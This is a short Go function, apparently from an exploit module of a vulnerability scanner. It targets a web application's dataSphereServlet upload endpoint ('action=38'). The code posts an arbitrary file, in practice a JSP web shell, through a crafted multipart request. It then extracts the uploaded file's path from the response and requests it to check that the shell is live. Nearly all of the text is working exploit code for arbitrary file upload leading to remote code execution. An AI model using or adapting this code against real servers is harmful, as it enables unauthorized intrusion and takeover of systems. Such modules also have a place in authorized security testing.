	sendPayload64231asqwesad := func(hostInfo *httpclient.FixUrl, filename, fileContent string) (*httpclient.HttpResponse, string, error) {
		cfg := httpclient.NewPostRequestConfig(fmt.Sprintf("/servlet/dataSphereServlet?action=38&path=&saveServer=1"))
		cfg.VerifyTls = false
		cfg.Timeout = 60

		cfg.Header.Store("Content-Type", " multipart/form-data; boundary=---wellqlike520---")
		cfg.Data = fmt.Sprintf("---wellqlike520---\r\nContent-Disposition: form-data; name=\"filename\"; filename=\"%s\"\r\n\r\n%s\r\n---wellqlike520---\r\nContent-Disposition: form-data; name=\"path\"\r\n\r\n\r\n---wellqlike520-----\r\n", filename, fileContent)

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, "", err
		}
		if strings.Contains(resp.Utf8Html, "openFileCallback") && strings.Contains(resp.Utf8Html, ".jsp") {
			re := regexp.MustCompile(`parent\.openFileCallback\("([^']+)","([^']+)"\)`)
			matches := re.FindStringSubmatch(resp.Utf8Html)
			if len(matches) >= 1 {
				webshellFilename := matches[2]
				checkRequestConfig := httpclient.NewGetRequestConfig(webshellFilename)
				checkRequestConfig.VerifyTls = false
				checkRequestConfig.FollowRedirect = false
				respCheck, err := httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
				return respCheck, webshellFilename, err
			}
		}
		return nil, "", nil
	}

